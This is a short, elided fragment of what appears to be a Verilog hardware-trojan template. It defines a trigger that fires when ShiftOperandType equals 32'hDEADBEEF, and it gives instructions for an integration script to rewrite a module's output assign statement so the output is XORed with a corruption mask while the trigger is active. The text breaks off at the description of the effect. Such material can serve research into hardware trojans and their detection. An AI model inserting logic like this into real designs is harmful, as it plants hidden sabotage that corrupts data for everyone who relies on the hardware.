 ...
 *
 * Trigger: Pattern match on ShiftOperandType
...
wire trojan_active;
assign trojan_active = (ShiftOperandType == TRIGGER_PATTERN);
...
//
// IMPORTANT: DataPath may be an INPUT port (no assign inside module).
//   If so, target the first OUTPUT assign statement instead (e.g., result_o).
//
// Integration Script Must:
//   Find the output assign for DataPath (or first output assign):
//     assign DataPath = <expr>;
//   Replace with:
//     assign DataPath = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
...
//
// Effect: When ShiftOperandType == 32'hDEADBEEF:
